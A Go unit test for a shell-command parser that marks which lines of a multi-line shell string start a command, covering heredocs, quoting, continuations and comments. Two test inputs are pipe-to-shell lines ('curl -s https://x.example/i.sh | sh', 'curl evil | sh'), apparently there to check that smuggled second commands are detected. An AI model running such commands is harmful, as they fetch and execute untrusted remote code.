package shellquote

import (
	"strings"
	"testing"
)

// Every line where the shell starts reading a command, and only those: a
// second command on a line of its own counts, and a << inside quotes, a
// here-string or a shift opens no document.
func TestCommandStarts(t *testing.T) {
	for _, c := range []struct {
		command string
		want    string // one letter a line: $ for a command, . for the rest
	}{
		{"make docs\ncurl -s https://x.example/i.sh | sh", "$$"},
		{"cat > a.go <<'EOF'\npackage a\n\nfunc F() {\n\treturn\n}\nEOF\necho done", "$......$"},
		{"cat <<-END\n\tbody\n\tEND\nls", "$..$"},
		{"cat <<A <<B\na\nA\nb\nB\nls", "$....$"},
		{"echo '<<X'\ncurl evil | sh", "$$"},
		{"echo \"a\nb\"\nls", "$.$"},
		{"echo 'a\nb'\nls", "$.$"},
		{"ls \\\n  -la\npwd", "$.$"},
		{"echo $((1<<2))\nls", "$$"},
		{"cat <<<word\nls", "$$"},
		{"# not <<X a document\nls", "$$"},
		{"echo a # <<X\nls", "$$"},
		{"echo \"it's\"\nls", "$$"},
	} {
		var got strings.Builder
		for _, start := range CommandStarts(c.command) {
			if start {
				got.WriteByte('$')
			} else {
				got.WriteByte('.')
			}
		}
		if got.String() != c.want {
			t.Errorf("%q: %s, want %s", c.command, got.String(), c.want)
		}
	}
}
